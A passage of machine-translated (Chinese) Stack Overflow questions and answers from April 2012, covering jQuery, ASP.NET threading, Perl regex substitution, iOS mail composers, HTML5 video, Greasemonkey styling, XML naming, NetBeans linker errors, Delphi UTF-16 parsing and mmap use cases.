        this.value = Math.ceil(this.value * 4) / 4;
        $.post("/Log/UpdateWorkItemHours", { 
        //valid arguments
        }, function (hours) { 
            hoursElement.value = hours;
            updateSum(); 
        });
    });
});

function updateSum() {
    var sum = 0;
    $('.Hours').each(function () {
        sum += parseFloat($(this).val());
    });
    $('#sum').text("Total Hours: " + sum);
    alert(sum);
} 
```

HTML：

```
<input type="text" class="numeric Hours" value="4"   />
<input type="text" class="numeric Hours" value="4"   />
<input type="text" class="numeric Hours" value="21"   />

<span class="numeric" id="sum">Total Hours: 0</span> 
```

我的警报发生在（在代码中）应该更改#sum 的内容之后，并且它显示正确的数字，但是，直到我在页面周围随机单击或使用选项卡更改焦点几次，页面才会更新。此外，警报仅用于调试；这是在我添加它之前发生的。

代码顺序： 1\. 计算总和 2\. 更新页面 3\. 弹出警报

执行顺序： 1\. 计算总和 2\. 弹出警报 3\. 等到用户随机点击内容 4\. 更新页面

有任何想法吗？

编辑：添加了 HTML 和调用该函数的事件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:58:01.097

似乎在于回调函数的时机。如果你把那块拿出来，一切都在 IE 中按预期工作：

```
$('body').on('change', '.Hours', function () {
    this.value = Math.ceil(this.value * 4) / 4;
    updateSum();
}); 
```

我意识到该帖子可能会创建要添加在一起的输入，只是试图帮助查明问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:58:31.483

换线试试

```
this.value = Math.ceil(this.value * 4) / 4; 
```

至

```
$(this).val(Math.ceil($(this).val() * 4) / 4;) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:37:33.257

您是否有多个 ID 为**sum**的元素？Chrome 可能选择了第一个，而 IE 选择了另一个（或根本没有）。

我不得不翻开我的网络安全书，但我记得读过他们以不同的方式处理这种情况。

**编辑：**

刚刚使用您提供的代码（当然减去 AJAX 调用）在 Chrome 和 IE7-9 中测试[了这个 jsFiddle ，它工作正常。](http://jsfiddle.net/ZeM8H/1/)

因此，要么您的 AJAX 调用在 IE 中失败（不太可能），要么您有我看不到的语法错误。

# asp.net - 在与 Web 服务不同的线程上调用外部 Web 服务

> ID：10218339
> 
> 赞同：0
> 
> 时间：2012-04-18T21:30:37.473
> 
> 标签：asp.net, .net, web-services, vb.net-2010

这是当前的功能：

1.  我的网站同步调用我的 ASP.NET Web 服务。
2.  我的 Web 服务在数据库中创建了一条记录。
3.  我的 Web 服务立即将新的记录 ID 返回到该网站。
4.  我的网站向用户显示该记录 ID。

这一直运作良好。我必须添加一个功能，以便在第 2 步之后，我的 Web 服务将调用 1 到 6 个（取决于条件）外部 Web 服务。所以它看起来像这样：

1.  我的网站同步调用我的 ASP.NET Web 服务。
2.  我的网络服务在数据库中创建了一条记录。
3.  我的网络服务调用外部网络服务。合并结果并保存在数据库中。
4.  我的网络服务将新的记录 ID 返回到网站。
5.  我的网站向用户显示该记录 ID。

由于这项新功能，现在网站请求可能需要 10 分钟。所以这就是我想实现新功能的方式。

1.  我的网站同步调用我的 ASP.NET Web 服务。
2.  我的网络服务在数据库中创建了一条记录。
3.  我的 Web 服务创建一个新线程并在该线程上调用一个方法（即发即弃）。此方法将调用外部 Web 服务，合并结果并保存在数据库中。由于这将在另一个线程上，执行将在完成第 3 步之前立即转到第 4 步。
4.  我的 Web 服务立即将新的记录 ID 返回到该网站。
5.  我的网站向用户显示该记录 ID。

另外，我想为步骤 3 中创建的线程设置一些超时，以便任务必须在假设 10 分钟内结束，如果没有中止线程。

我尝试了 ThreadPool.QueueUserWorkItem，它甚至没有被调用，因为它是后台线程。最初 Thread / Task.TaskFactory 似乎可行，但为每个请求创建一个新线程似乎不是最佳实践。

有人可以为第 3 步提供一些 VB.NET 代码/参考吗？专门在单独的线程上调用外部 Web 服务，例如触发并忘记并为该线程设置超时？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T06:48:50.230

```
closeTimeout="04:01:00"
     openTimeout="04:01:00" receiveTimeout="04:10:00" sendTimeout="04:01:00"
     allowCookies="false" bypassProxyOnLocal="false"
     hostNameComparisonMode="StrongWildcard"
     maxBufferSize="2147483647" maxBufferPoolSize="2147483647"
     maxReceivedMessageSize="2147483647"
     messageEncoding="Text" textEncoding="utf-8"
     transferMode="StreamedResponse"
     useDefaultWebProxy="true" 
```

在您的绑定属性中尝试此操作。它有助于增加超时时间和处理大数据（mb）

# perl - 删除点但不删除小数点

> ID：10218345
> 
> 赞同：0
> 
> 时间：2012-04-18T21:31:05.620
> 
> 标签：perl, sed

我有一个空格分隔的文本文件，其中包含`.`作为缺失数据的句点和作为小数分隔符的句点。我想用`NaN`小数分隔符替换所有丢失的数据周期 - 这是一个示例：

样本数据：

```
1981 12 23 . 4.5 . .
1981 12 24 4.6 7.8 1.2 22.0
1981 12 25 . . . .
1981 12 26 2.1 . 3.1 . 
```

期望的输出：

```
1981 12 23 NaN 4.5 NaN NaN
1981 12 24 4.6 7.8 1.2 22.0
1981 12 25 NaN NaN NaN NaN
1981 12 26 2.1 NaN 3.1 NaN 
```

非常感谢在 unix 环境中使用 sed、tr、perl 的任何帮助

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-18T21:38:47.537

这个 Perl 程序会做到这一点，替换任何旁边没有数字的点：

```
#!/Users/brian/bin/perls/perl5.14.2

while( <DATA> ) {
    s/ (?<!\d) \. (?!\d) /NaN/xg;
    print;
    }

__END__
1981 12 23 . 4.5 . .
1981 12 24 4.6 7.8 1.2 22.0
1981 12 25 . . . .
1981 12 26 2.1 . 3.1 . 
```

这是一个简短的 Perl 单行代码：

```
% perl -pe 's/ (?<!\d) \. (?!\d) /NaN/xg' input_file 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-18T21:38:50.357

在这里使用否定的环视断言似乎是一个好主意。

```
perl -plwe 's/(?<!\d)\.(?!\d)/NaN/g;' file.txt 
```

换句话说，仅当周围的字符不是数字时才替换。如果您有以下数字，它可能会失败：（`.1231`而不是`0.1231`）。在这种情况下，您可以删除第一个环视。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-18T22:53:05.013

这可能对您有用：

```
sed ':a;s/ \. / Nan /g;ta;s/ \.$/ Nan/' file 
```

或者如果`.123`不存在这样的数字：

```
sed 's/ \./ Nan/g' file 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-04-18T21:35:00.917

检查点后的下一个字符是否为空格。如果是，请在此处添加一个 NaN。

# html - 根据字段值或单击添加按钮一一显示 HTML 表格行

> ID：10218347
> 
> 赞同：-1
> 
> 时间：2012-04-18T21:31:22.540
> 
> 标签：html, html-table, row

我的表中有几行包含 10 种合并症。

```
<table>
   <!-- Co-Morbidities1 -->
<tr id="como1">
    <td>Row1&nbsp;</td>
    <td>Co-Morbidities1&nbsp;</td>
    <td>value column</td>
</tr>
  <!--  Co-Morbidities2 -->
<tr id="como2">
    <td>Row2&nbsp;</td>
    <td>Co-Morbidities2&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities3 -->
<tr id="como13">
    <td>Row3&nbsp;</td>
    <td>Co-Morbidities3&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities4 -->
<tr id="como4">
    <td>Row4&nbsp;</td>
    <td>Co-Morbidities4&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities5 -->
<tr id="como5">
    <td>Row5&nbsp;</td>
    <td>Co-Morbidities5&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities6 -->
<tr id="como6">
    <td>Row6&nbsp;</td>
    <td>Co-Morbidities6&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities7 -->
<tr id="como7">
    <td>Row7&nbsp;</td>
    <td>Co-Morbidities7&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities8 -->
<tr id="como8">
    <td>Row8&nbsp;</td>
    <td>Co-Morbidities8&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities9 -->
<tr id="como9">
    <td>Row9&nbsp;</td>
    <td>Co-Morbidities9&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities10    -->
<tr id="como10">
    <td>Row10&nbsp;</td>
    <td>Co-Morbidities10&nbsp;</td>
    <td>&nbsp;</td>
</tr></table> 
```

我想要实现的是，我不想一次显示 10 行，而是一次显示一个。如果填充了第一行值，那么我希望显示第二行，如果填充了第二行值，那么我希望显示第三行，依此类推。我希望根据填充上一行中的值逐步显示行。

我是 Javascript 新手，刚开始学习。我确实在谷歌上花了几个小时，并没有找到快乐。请问有人可以帮忙吗？非常感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:44:53.757

简单示例[http://jsfiddle.net/tJdFZ/](http://jsfiddle.net/tJdFZ/)

使用 jquery 这一行隐藏了表中的所有行 $('table tr').hide(); 然后我显示第一行 $('table tr:eq(0)').show(); eq 选择器根据数字选择元素，0 表示第一行，1 表示第二行，以此类推。

然后我只需使用按钮单击，将 1 添加到当前行，并显示该行。您可以使用相同的想法一次隐藏一行，或者您可以制作一个按钮来显示所有行等。

编辑我创建了另一个隐藏一行的函数[http://jsfiddle.net/tJdFZ/1/](http://jsfiddle.net/tJdFZ/1/)

编辑好吧，最后一次尝试。通过向“tr”添加一个类，您可以拥有由按钮控制的行和静态的行。看看新的小提琴 [http://jsfiddle.net/tJdFZ/24/](http://jsfiddle.net/tJdFZ/24/)

HTML

```
<table>
<tr>
    <td colspan=3>Static Row</td>
</tr>
<tr>
    <td colspan=3>Static Row</td>
</tr>
<tr>
    <td colspan=3>Static Row</td>
</tr>
   <!-- Co-Morbidities1 -->
<tr id="como1" class="showhide">
    <td>Row1&nbsp;</td>
    <td>Co-Morbidities1&nbsp;</td>
    <td>value column</td>
</tr>
  <!--  Co-Morbidities2 -->
<tr id="como2" class="showhide">
    <td>Row2&nbsp;</td>
    <td>Co-Morbidities2&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities3 -->
<tr id="como3" class="showhide">
    <td>Row3&nbsp;</td>
    <td>Co-Morbidities3&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities4 -->
<tr id="como4" class="showhide">
    <td>Row4&nbsp;</td>
    <td>Co-Morbidities4&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities5 -->
<tr id="como5" class="showhide">
    <td>Row5&nbsp;</td>
    <td>Co-Morbidities5&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities6 -->
<tr id="como6" class="showhide">
    <td>Row6&nbsp;</td>
    <td>Co-Morbidities6&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities7 -->
<tr id="como7" class="showhide">
    <td>Row7&nbsp;</td>
    <td>Co-Morbidities7&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities8 -->
<tr id="como8" class="showhide">
    <td>Row8&nbsp;</td>
    <td>Co-Morbidities8&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities9 -->
<tr id="como9" class="showhide">
    <td>Row9&nbsp;</td>
    <td>Co-Morbidities9&nbsp;</td>
    <td>&nbsp;</td>
</tr>
  <!--  Co-Morbidities10    -->
<tr id="como10" class="showhide">
    <td>Row10&nbsp;</td>
    <td>Co-Morbidities10&nbsp;</td>
    <td>&nbsp;</td>
    </tr></table>
<input type=button value="Show 1 more" id="onemore" />
<input type=button value="Hide 1" id="oneless" />​ 
```

查询

```
var currentrow = 0;
var maxrows = $('.showhide').size() - 1;

$('table tr.showhide').hide();
$('table tr.showhide:eq(0)').show();

$("#onemore").click(function() {
    if (currentrow < maxrows) {
        currentrow++;
        $('table tr.showhide:eq(' + currentrow  + ')').show();
    }
});

$("#oneless").click(function() {
    if (currentrow > 0) {
        $('table tr.showhide:eq(' + currentrow  + ')').hide();
        currentrow--;
    }
}); 
```

# ios - 从 iPad 上的模态 FormSheet 呈现 MFMailComposeViewController？

> ID：10218348
> 
> 赞同：3
> 
> 时间：2012-04-18T21:31:27.080
> 
> 标签：ios, cocoa-touch, ipad

有没有人成功地`MFMailComposeViewController`从`UIModalPresentationStyleFormSheet`iPad 上的视图控制器展示标准 Apple？

当我这样做时，视图按预期显示，但是当用户点击任何输入文本视图时，例如主题，并且按下取消按钮的键盘幻灯片将在外部显示“删除草稿”和“保存草稿”弹出窗口屏幕边界。

如果我将模式视图更改为全屏，它可以正常工作。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-18T23:11:32.623

我认为您不会将其呈现为表格。使用此代码为我创造了奇迹：

```
MFMailComposeViewController *mailViewController = [[MFMailComposeViewController alloc] init];

mailViewController.mailComposeDelegate = self;
[mailViewController setSubject:@"Subject"];
[mailViewController setMessageBody:@"" isHTML:NO];
mailViewController.modalPresentationStyle = UIModalPresentationFormSheet;

[self presentModalViewController:mailViewController animated:YES]; 
```

# php - 如何使用 PHP 和 Javascript 将数据从一个页面传递到另一个页面？

> ID：10218358
> 
> 赞同：2
> 
> 时间：2012-04-18T21:31:57.110
> 
> 标签：php, javascript, post, cookies

我有 3 个按钮（图片链接，最终会演变为 javascript 或更好的东西）

这些按钮中的每一个都应该向处理程序脚本发送一个值，如果按下按钮 1，该处理程序脚本执行选择 1，选择 2，依此类推。

我想知道最好的方法是什么。我不想使用 GET。如果可能的话，我想使用 POST，但我不这么认为。我也想过cookie，但问题是即使你可以通过链接调用JS函数来创建cookie，你不能去PHP页面处理，在同一次点击中可以吗？

它会像用户单击按钮 img 一样工作，然后将它们带到处理程序脚本，但处理程序甚至在他们知道他们在那里之前将它们重定向回来。

同样，这不是表单，我需要使用超链接来执行此操作。我想我可以为每个选择设置一个不同的页面，但我认为这不是有效的。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:43:58.010

如果您希望使用 POST 传递变量，您可以在页面上创建一个表单，并让您的链接在 onClick 处执行一些 javascript 代码。他们将变量设置为所需的值，然后提交表单。关键线将类似于：

```
document.getElementById("user_choice").value = 2;   // or whatever the value for this link is
document.getElementById("my_form").submit(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T21:43:16.807

你可以把你的图片链接变成：

```
<form method="post" action="blah">
    <input type="hidden" name="function" value="function1" />
    <input type="image" scr="whatever" />
</form> 
```

这样它们看起来仍然像图像，但实际上是带有您想要的任何内容的发布表单。无论如何，这是简单的方法。更难的方法是使用 AJAX。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-18T21:43:51.557

如果您想使用 JavaScript，请查看[jQuery](http://jquery.com/)。使用[jQuery 的 click-method](http://api.jquery.com/click/)，您可以轻松处理对元素的点击：

假设你有这个 HTML：

```
<div id="target">
  Click here
</div>
<div id="other">
  Trigger the handler
</div> 
```

使用 jQuery，您可以轻松跟踪标记为目标的元素的点击：

```
$("#target").click(function() {
  alert("Handler for .click() called.");
}); 
```

如果您不想直接发布或获取点击，我建议注册 jQuery 点击处理程序，它根据点击的元素设置 JavaScript 变量。

请注意，jQuery 的点击处理程序可以注册到任何元素，而不仅仅是表单。此外请注意，例如上面的点击处理程序不会将页面发布或获取到服务器。

此外，请看这里，关于如何防止浏览器提交表单：[将“return false”添加到单击事件侦听器的效果是什么？](https://stackoverflow.com/questions/128923/whats-the-effect-of-adding-return-false-to-an-onclick-event)

比 JavaScript 更好的是[CoffeScript](http://coffeescript.org/)，它可以编译成 JavaScript，但让生活变得更容易。试试看！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-18T21:41:36.557

AJAX 呢？这是解决您的问题的最佳选择，而且您也可以使用 post。

# google-chrome - HTML5 问题 Chrome/Safari - 停止加载/不加载

> ID：10218365
> 
> 赞同：1
> 
> 时间：2012-04-18T21:32:28.890
> 
> 标签：google-chrome, video, safari, load, html5-video

网站：[http ://www.ignitionpointventures.com](http://www.ignitionpointventures.com)

大家好，

我在 chrome/safari 上遇到 html5 视频加载问题。基本思想是在右侧有一个带有视频缩略图的视频容器。我创建了一个单独的 html 文件，其中包含要放置在视频容器中的每个视频的 html5 视频信息。在页面加载时，第一个视频应该使用准备好的 jquery 文档自动加载，随后每个拇指加载适当的 html5/视频。

问题：在 Chrome 和 Safari 上。

在 Chrome 上，加载的视频不会出现。单击拇指时，视频的第一个图像出现在主视频 div 中，但似乎停止加载并且不会播放。

在 Safari 上，视频根本不加载。尝试直接播放文件时出现错误，并且 quicktime 符号显示为？标记。

这是html5视频的示例

```
<video width="721px" height"406px" preload="auto" controls="controls">
        <embed src="http://www.ignitionpointventures.com/includes/video/v1/v1.mp4" width="721" height="406" allowscriptaccess="always" allowfullscreen="true"></embed>
        <source src="http://www.ignitionpointventures.com/includes/video/v1/v1.mp4" type="video/mp4" />
        <source src="http://www.ignitionpointventures.com/includes/video/v1/v1.ogv" type="video/ogg" codecs="theora, vorbis" />

         <source src="http://www.ignitionpointventures.com/includes/video/v1/v1.webm" type="video/webm" />

        <p>Your browser does not support HTML5 video.</p>
</video> 
```

这是javascript

```
<script type="text/javascript">
    $(document).ready(function(){
        $('#leftVideo').load('http://www.ignitionpointventures.com/includes/video/v1/v1.html'); 
    });

    $(function() {
        $(".v1").click(function(){
            $('#leftVideo').load('http://www.ignitionpointventures.com/includes/video/v1/v1.html');
        });
        $(".v2").click(function(){
            $('#leftVideo').load('http://www.ignitionpointventures.com/includes/video/v2/v2.html');
        });
        $(".v3").click(function(){
            $('#leftVideo').load('http://www.ignitionpointventures.com/includes/video/v3/v3.html');
        });
        $(".v4").click(function(){
            $('#leftVideo').load('http://www.ignitionpointventures.com/includes/video/v4/v4.html');
        });
    });
</script> 
```

我也检查了 .htaccess 文件

我知道视频有点大，可能是个问题，但怀疑这是真正的问题。是的，JavaScript 可能更先进。

谢谢！

# javascript - 如何使用 javascript 更改文本颜色？

> ID：10218366
> 
> 赞同：1
> 
> 时间：2012-04-18T21:32:30.953
> 
> 标签：javascript, facebook, greasemonkey

好的，我正在尝试为 facebook 制作一个greasemonkey 脚本，我需要将主页按钮文本的颜色更改为黑色，我设法为上面有你名字的按钮做到了，但我不知道怎么做为主页按钮做到这一点！这就是我做按钮的方式，上面有你的名字，效果很好！

```
$('.headerTinymanName').each(function(){
   $(this).css('color', 'black');
}); 
```

这是主页按钮的css，但我不知道如何更改颜色！

```
.slimHeader #pageNav a{color:#d8dfea} 
```

我很困惑，任何帮助将不胜感激！:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:35:14.227

可能你可以通过使用分配另一个 css 类

```
document.getElementById("MyElement").className += " MyClass"; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T21:45:43.423

这个 GreaseMonkey 脚本怎么样：

```
// ==UserScript==
// @name           FBoo
// @namespace      FBoo
// @description    FBoo
// @include        https://www.facebook.com/home.php
// @require        http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.min.js
// ==/UserScript==

$('#navHome a').css('color', 'black'); 
```

如果您想`a`一次将标题中的所有标签都设为黑色，您可以按照以下方式进行操作：

```
$('#headNav a').css('color', 'black'); 
```

或者，您也可以不使用 jQuery。沿着这些思路的一个稍微有点骇人听闻的建议是：

```
document.querySelectorAll('#navHome a')[0].style.color = 'black'; 
```

# javascript - javascript xml getElementsByTagName 其中标签是一个数字

> ID：10218369
> 
> 赞同：0
> 
> 时间：2012-04-18T21:32:41.153
> 
> 标签：javascript, xml

我的一段 JavaScript 代码已经运行了一段时间，可以从传入的 xml 通信中获取值，但它突然停止报告通过某些标签找到的任何元素。我做了一些查看，似乎只有数字标签会受此影响，一旦我切换回字母，一切都很好。有什么原因我不能只使用数字吗？

Javascript代码：

```
xmlhttp.onreadystatechange=function()
{
    xmlDoc=xmlhttp.responseXML;
    x=xmlDoc.getElementsByTaName("VAR");
    alert(x.length); // <- reports 0 when numbers are used as tags
    var dataBack = [];
    for (j=0;j<x.length;j++) {
        dataBack[j] = x[0].getElementsByTagName(x[j])[0].childNodes[0].nodeValue);
    }
    useXMLdata(dataBack);
 } 
```

我尝试在我的数字标签中添加一个字母，它神奇地开始工作。我正在使用它来实际捕获标签，但我很好奇为什么我不能只使用数字。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:40:54.213

只有数字的元素（例如`<8>Some content</8>`）似乎不是有效的 XML。

[XML 规范](http://www.w3.org/TR/REC-xml/)非常繁琐，但第[3.1 节](http://www.w3.org/TR/REC-xml/#sec-starttags)定义了开始标记命名。开始标记名称必须以`NameStartChar`字符开头，然后以任意数量的`NameChar`字符继续。

`NameStartChar`似乎是`NameChar`其中不包括数字 0-9 的子集。因此，有效的标签名称不能以数字开头。

我怀疑您的 XML 是否会验证它是否包含 XML 元素，例如`<8>Something</8>`. 这是否是您的 JavaScript 失败的原因我不知道，但有足够的理由不以这种方式构建您的 XML。

**编辑**

尝试将以下 XML 插入[验证器](http://www.w3schools.com/dom/dom_validate.asp)：

```
<?xml version="1.0" ?> 
<Root>
  <Child>
    <1xyz>Content</1xyz>
  </Child>
</Root> 
```

这给出了标签的错误**元素名称无效。**`<1xyz>`甚至 SO 也不喜欢它，因此缺少语法高亮！

# c++ - Netbeans 特定的 C++ 错误“未定义对 XXX 的引用”-（已发布解决方案）

> ID：10218370
> 
> 赞同：7
> 
> 时间：2012-04-18T21:32:42.790
> 
> 标签：c++, netbeans

我为这个问题争论了 5 到 6 个小时，把头发拔了出来，直到我终于找到了解决办法。我想发布这个（不确定是否有特定的地方可以发布未提出问题的解决方案）作为可能遇到同样困难的其他人的解决方案。

我正在编写在 Linux Mint Lisa 上运行的 Netbeans 7.1.1 中的 C++ 项目，并在尝试使用静态变量时不断收到“未定义对 XXX 的引用”错误。来自 C# 的背景，因此对头文件等不太熟悉，我搜索了几个小时，希望找到我声明变量或类的方式的问题。我什么都找不到...

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-23T06:33:32.837

转到 Netbeans 文件资源管理器中的 nbproject 文件夹。打开configurations.xml 文件。向下滚动到属性 name="SourceFiles" 的logicalFolder 标记。确保所有 .h 和 .cpp 文件都作为 itemPath 标记包含在logicalFolder 标记中！Netbeans 正确地添加了一些，但不是我的所有 cpp 和 h 文件，因此出现了问题。不知道为什么会出现这种不一致，因为所有类和头文件都是通过同一个 Netbeans 向导添加的。无论如何，随着配置文件的更改，makefile 会在下一次构建时更新并正确写入，并且所有功能都按预期运行。希望这可以帮助某人！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-06-19T21:28:09.127

只需为 Levi 的答案添加更多详细信息（对于像我这样的新手），单击屏幕左侧的“文件”选项卡，您的文件和文件夹列表所在的位置。这为您提供了与“项目”选项卡不同的文件列表。

如果您的项目文件夹尚未展开，请展开它。结果文件夹之一是“nbproject”。展开文件夹。这是configurations.xml 所在的位置。

简而言之：

文件选项卡 > nbproject > configuration.xml

但是，将 .h 文件添加到 configuration.xml 对我不起作用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-15T00:51:19.760

就我而言，我只需要将源文件作为#include 行包含在其他源文件中即可使其正常工作……我可以毫无错误地编译各个源文件，但该项目是另一回事。一旦我在需要找到某些方法的其他源文件中添加了#include 行，它就会按计划工作。希望这可以帮助某人。

# delphi - 从原始字节数组中搜索 Unicode 字符 - 免费 Pascal\Lazarus 或 Delphi

> ID：10218372
> 
> 赞同：2
> 
> 时间：2012-04-18T21:32:52.247
> 
> 标签：delphi, unicode, bytearray, freepascal

我不想解释为什么和如何让人们感到厌烦，所以我会直接跳进去。

我有一个包含原始字节数据的字节数组。该数组为 1000 个字节。我想遍历那个 1000 字节的数组，只提取可能类似于文件名的 UTF-16 Unicode 字符，但我不知道字符出现在那个 1000 字节数组中的确切位置。

我已经阅读了 [Lazarus Unicode Page](http://wiki.freepascal.org/LCL_Unicode_Support)和[这个](http://www.joelonsoftware.com/articles/Unicode.html)，但我仍然对我的问题的句法方法有些不确定。我知道 Unicode 字符的大小最多为 4 个字节，但通常是两个（一个字母和一个空格）。

我已经成功地使用了 UTF8encode(WideCharLenToString(@MyArray,SomeIntValue) 在我知道某些 Unicode 字符存在于我询问的[该线程](http://www.lazarus.freepascal.org/index.php/topic,16662.msg90928.html#msg90928)的其他区域并且现在已解决。但我现在需要“寻找”它们，因为一个不同的原因，在数组中。例如“*查看前 16 个字节。它们是 Unicode 吗？如果不是，请查看接下来的 16 个。它们是 Unicode 吗？如果是，将它们转换为字符串并显示它们”*。

谁能帮我？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T00:05:03.967

在不知道字节的实际布局或文件名格式的情况下（是否有驱动器号和路径，是否使用 UNC 路径，或者它本身只是一个文件名？），寻找文件名的边界字符串会很困难。

如果您可以假设文件名始终以驱动器号和路径开头，那么您可以一次循环一个字节的数组，直到您解码一个六字节的 UTF-16 序列，该序列由`'a'`-`'z'`或`'A'`-之间的字符组成，`'Z'`后跟`':'`和`'\'`人物。如果发现这种情况，请继续解码 UTF-16 序列，直到遇到解码的空字符或不是有效 UTF-16 序列的二进制值，例如：

```
var
  Buffer: array[0..1000-1] of Byte;
  I: Integer;
  PCh: PWord;
  Hi, Lo: Word;
  Ch: Cardinal;
  PStart: PWideChar;
  Len: Integer;
  FileName: WideString;
begin
  ...

  I := 0;
  while I <= (SizeOf(Buffer)-6) do
  begin
    PCh := PWord(@Buffer[I]);
    if not (((PCh^ >= Ord('a')) and (PCh^ <= Ord('z'))) or ((PCh^ >= Ord('A')) and (PCh^ <= Ord('Z')))) then
    begin
      Inc(I);
      Continue;
    end;
    Inc(PCh);    
    if PCh^ <> Ord(':') then
    begin
      Inc(I);
      Continue;
    end;
    Inc(PCh);
    if PCh^ <> Ord('\') then
    begin
      Inc(I);
      Continue;
    end;
    PStart := PWideChar(@Buffer[I]);
    Len := 0;
    Inc(I, 6);
    Inc(PCh);
    while I <= (SizeOf(Buffer)-2) do
    begin
      if (PCh^ < $D800) or (PCh^ > $DFFF) then
      begin
        Ch := Cardinal(PCh^);
        Inc(I, 2);
        if Ch = 0 then Break;
        Inc(Len);
      end else
      begin
        if PCh^ > $DBFF then Break;
        if (I+2) = SizeOf(Buffer) then Break;
        Hi := PCh^;
        Inc(PCh);
        if (PCh^ < $DC00) or (PCh^ > $DFFF) then Break;
        Lo := PCh^;
        Ch := ((Cardinal(Hi) - $D800) * $400) + (Cardinal(Lo) - $DC00) + $10000;
        if Ch > $10FFFF then Break;
        Inc(I, 4);
        Inc(Len, 2);
      end;
    end;
    SetString(FileName, PStart, Len);
    if Len > 0 then
    begin
      ... use FileName as nedeed...
    end;
  end;
  ...
end; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T08:42:43.440

UTF-16 代码点的长度为 2 个字节或 4 个字节。这不是一个字母和一个空格；单独来看，大多数 16 位字都是有效的 UTF-16 字符。（值在 D800 和 DBFF 之间的代码点需要后跟 DC00-DFFF 范围内的值才能构成一个完整的 Unicode 字符。）如果您只是在寻找有效的 UTF-16，那么您不太可能取得很大进展。您需要查看在文件名中找到的特定模式，例如 .ext（将在 UTF-16 中编码为 \00.\00e\00x\00t 或 .\00e\00x\00t\00，具体取决于它是否大端或小端。）

# c++ - mmap 的用例

> ID：10218374
> 
> 赞同：1
> 
> 时间：2012-04-18T21:32:58.453
> 
> 标签：c++, linux, memory, memory-management

我目前正在为我的**操作系统**决赛而学习。一些论文中的老师简单地提到了`mmap`函数（内存映射）。

据我了解（**如果我错了，请纠正我**），mmap 用于将一些文件从物理内存加载到 RAM（在页面默认值之后）。问题是我没有看到任何实际原因，否则可以加快对该文件的访问时间。

我对么？mmap 仅用于此目的吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-18T21:40:25.680

“mmap”有很多用途：

1.  映射文件以实现更快的读/写访问当然是一种用途

2.  共享内存（例如用于进程间通信）是另一个

3.  mmap 还用于映射 I/O 端口地址以进行低级设备通信

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-18T21:41:39.903

> mmap 用于将一些文件从物理内存加载到 RAM 中（页面默认后）

加载丢失的*页面*。也可以以相同的方式将修改写入磁盘！

*   性能（您不必加载整个文件），如果您有随机访问权限，效果会非常好。
*   它可以大大使您的代码更紧凑，您不必担心文件 I/O。
*   操作系统可以处理内存管理，决定将哪些页面保留在内存中以及丢弃哪些页面。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-18T21:47:43.483

除了@paulsm4 的回答：

1.  ...
2.  ...
3.  ...
4.  大多数现代[`malloc(3)`](http://www.kernel.org/doc/man-pages/online/pages/man3/malloc.3.html)实现用于[`mmap(2)`](http://www.kernel.org/doc/man-pages/online/pages/man2/mmap.2.html)管理私有进程内存。
5.  动态链接加载器[`ld.so(8)`](http://www.kernel.org/doc/man-pages/online/pages/man8/ld.so.8.html)使用它来映射共享库。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-18T22:32:25.150

mmap 在很大程度上将内存管理从程序员手中拿了出来，交给了 OS。

它是关于使用虚拟内存子系统从磁盘到物理内存的需求分页。

因此，要查看文件的第 11111 个字节，而不是查找和读取，您可以 mmap 并使用数组索引。操作系统会将周围的数据保存在其“缓冲区缓存”（实际上是页面缓存）中。

这是一个例子： [http ://stromberg.dnsalias.org/~strombrg/pbmonherc.html](http://stromberg.dnsalias.org/~strombrg/pbmonherc.html)

这个例子有点混乱，因为它是在 Linux 内核中支持 mmap 的时候编写的，但是 C 库还没有用于调用它的存根。但是你几乎可以忽略 mmap.c。该示例使用 mmap 使用单色显示适配器设置像素的开启和关闭。

